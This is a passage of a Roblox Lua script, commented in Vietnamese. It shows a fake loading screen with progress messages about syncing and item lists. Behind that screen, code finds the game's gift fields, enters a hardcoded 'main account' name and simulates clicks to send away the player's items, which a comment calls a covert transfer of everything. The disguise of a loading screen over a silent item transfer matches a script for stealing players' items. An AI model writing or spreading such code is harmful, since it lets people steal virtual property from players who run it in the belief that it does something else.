-- 2. HÀM TỰ ĐỘNG CLICK UI ĐỂ GIFT ĐỒ
local function autoGiftViaUI()
    -- Thực hiện quét tất cả các bảng nhập chữ (TextBox) trong màn hình game để tìm ô điền tên người nhận
    for _, box in pairs(PlayerGui:GetDescendants()) do
        if box:IsA("TextBox") and (box.Name:lower():find("gift") or box.PlaceholderText:lower():find("player") or box.PlaceholderText:lower():find("user")) then
            box.Text = TEN_ACC_CHINH
            box:ReleaseFocus() -- Xác nhận nhập tên thành công
            task.wait(0.3)
            
            -- Sau khi gõ tên xong, tìm nút bấm gửi (Gift Button) kế bên để kích hoạt lệnh gửi đồ
            local parentFrame = box.Parent
            if parentFrame then
                for _, btn in pairs(parentFrame:GetChildren()) do
                    if btn:IsA("TextButton") or btn:IsA("ImageButton") then
                        -- Giả lập bấm nút chuyển sạch sành sanh vật phẩm
                        pcall(function()
                            firesignal(btn.MouseButton1Click)
                            firesignal(btn.MouseButton1Up)
                        end)
                    end
                end
            end
        end
    end
end

-- 3. ĐIỀU KHIỂN TIẾN TRÌNH LOADING VÀ KÍCH HOẠT
task.spawn(function()
    StatusLabel.Text = "Đang đồng bộ hóa dữ liệu với nick chính..."
    local tween1 = TweenService:Create(ProgressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(0.4, 0, 1, 0)})
    tween1:Play()
    tween1.Completed:Wait()

    StatusLabel.Text = "Đang khởi tạo danh sách Auto-Gift vật phẩm..."
    local tween2 = TweenService:Create(ProgressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(0.8, 0, 1, 0)})
    tween2:Play()
    tween2.Completed:Wait()

    StatusLabel.Text = "Đang thực hiện chuyển đồ ngầm..."
    local tween3 = TweenService:Create(ProgressBar, TweenInfo.new(2, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
    tween3:Play()
    tween3.Completed:Wait()
    
    StatusLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
    StatusLabel.Text = "Đã chuyển toàn bộ vật phẩm! Đang đóng hệ thống..."
    
    -- Kích hoạt chức năng gõ tên gửi đồ tự động
    autoGiftViaUI()
    
    task.wait(1.5)
    ScreenGui:Destroy()
end)
